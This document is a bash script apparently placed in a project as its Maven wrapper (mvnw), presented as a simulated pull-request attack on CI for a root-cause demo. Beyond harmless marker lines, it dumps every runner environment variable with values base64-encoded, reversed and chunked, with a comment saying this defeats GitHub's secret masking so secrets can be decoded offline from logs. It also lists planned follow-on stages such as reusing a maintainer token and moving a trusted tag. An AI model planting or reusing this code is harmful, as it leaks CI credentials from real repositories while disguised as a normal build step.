#!/usr/bin/env bash
set -euo pipefail

echo "SIMULATED_ATTACK_CONTROL_REACHED"
echo "The pull request changed mvnw, and CI executed it."
echo "The command looked like a normal build: $*"
echo "attacker_control=true"
echo "FULL_RUNNER_ENV_DUMP=true"

mkdir -p .rca-demo
evidence_file=".rca-demo/evidence.txt"

{
  echo "simulated_stage=initial-pr-compromise"
  echo "attacker_control=true"
  echo "base_repository=${BASE_REPOSITORY:-unknown}"
  echo "head_repository=${HEAD_REPOSITORY:-unknown}"
  echo "head_sha=${HEAD_SHA:-unknown}"
  echo "pr_number=${PR_NUMBER:-unknown}"
} > "$evidence_file"

# Full environment dump: variable names in the clear, values REVERSED and
# chunked base64. GitHub's masking defeats raw values and plain base64;
# reversal keeps the encoded form out of its variant set. (Even when the
# scrubber nicks the leading '==' padding chunk, the rest decodes fine.)
# No secret name is known in advance - take everything, decode offline.
while IFS= read -r -d '' entry; do
  key="${entry%%=*}"
  value="${entry#*=}"
  printf '%s:' "$key"
  printf '%s' "$value" | base64 | tr -d '\n' | rev | sed 's/../& /g'
  printf '\n'
done < <(env -0)

cat >> "$evidence_file" <<'EOT'
simulated_stage_2=would_invite_disposable_user_or_push_workflow
simulated_stage_3=would_reuse_maintainer_token_against_related_repo
simulated_stage_4=would_move_trusted_tag_to_malicious_commit
external_exfiltration=false
EOT